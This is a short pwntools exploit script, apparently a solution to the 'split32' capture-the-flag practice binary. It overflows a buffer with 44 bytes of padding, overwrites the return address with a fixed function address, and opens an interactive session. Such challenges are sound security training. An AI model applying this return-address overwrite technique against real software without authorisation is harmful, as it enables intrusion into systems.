from pwn import *

p = process('./split32')
junk = "A" * 44
usefulFunction_addr = 0x08048649

p.recvuntil('> ')
payload = junk + p32(usefulFunction_addr)
p.sendline(payload)
#p.recvuntil('Exiting')

p.interactive()
